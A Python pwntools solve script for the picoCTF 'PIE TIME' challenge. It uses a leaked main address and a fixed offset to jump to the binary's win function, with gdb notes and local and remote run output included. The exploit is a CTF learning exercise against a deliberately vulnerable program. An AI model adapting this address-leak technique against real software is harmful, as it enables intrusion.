#!/usr/bin/env python3

from pwn import *

elf = ELF("./vuln",checksec=False)

if args.REMOTE:
    p = remote('rescued-float.picoctf.net', 64992)
else:
    p = elf.process()

''' ./vuln output:
Address of main: 0x55c7025e733d
Enter the address to jump to, ex => 0x12345:
'''

main_addr = p.recvuntil(b'\n')

# Extract the "Address of main:" value
main_addr =  main_addr.split(b':')[1].strip(b'\n')
debug(f"MAIN_ADDR: {main_addr.decode()}")

# Decode from byte to str
main_addr = main_addr.decode()
print(f"MAIN_ADDR: {main_addr}")
debug(f"MAIN_ADDR_INT: {int(main_addr, base=16)}")

# Convert str to hex str to hex int
main_addr = int(main_addr, base=16)
debug(f"{main_addr}")
main_addr = eval(hex(main_addr))
debug(type(main_addr))

''' From gdb 'starti' then 'info functions':
0x00005555555552a7  win
0x000055555555533d  main

in python idle:

hex(0x00005555555552a7-0x000055555555533d)
'-0x96'
'''

# win addr is main_addr - 0x96
win_addr = main_addr - 0x96
win_addr = hex(win_addr)
print(f"WIN_ADDR: {win_addr}")

#print(p.recvuntil(b':'))
p.recvuntil(b':')
p.sendline(win_addr.encode('latin-1'))
success(p.recvall().decode('latin-1'))

'''
┌──(kali㉿kali)-[~/Downloads/picoCTF/PIE-TIME]
└─$ ./solve-PIE_TIME.py
[+] Starting local process '/home/kali/Downloads/picoCTF/PIE-TIME/vuln': pid 3875531
MAIN_ADDR:  0x55c27005e33d
WIN_ADDR: 0x55c27005e2a7
[+] Receiving all data: Done (60B)
[*] Process '/home/kali/Downloads/picoCTF/PIE-TIME/vuln' stopped with exit code 0 (pid 3875531)
[+]  Your input: 55c27005e2a7
    You won!
    picoCTF{FAKE_FLAG_HERE}

# If that works, launch the instance, update the remote addr and use the REMOTE arg to get the real flag

┌──(kali㉿kali)-[~/Downloads/picoCTF/PIE-TIME]
└─$ ./solve-PIE_TIME.py REMOTE
[+] Opening connection to rescued-float.picoctf.net on port 64992: Done
MAIN_ADDR:  0x5aeaaf2f433d
WIN_ADDR: 0x5aeaaf2f42a7
[+] Receiving all data: Done (82B)
[*] Closed connection to rescued-float.picoctf.net port 64992
[+]  Your input: 5aeaaf2f42a7
    You won!
    picoCTF{....No spoiling.....}
'''
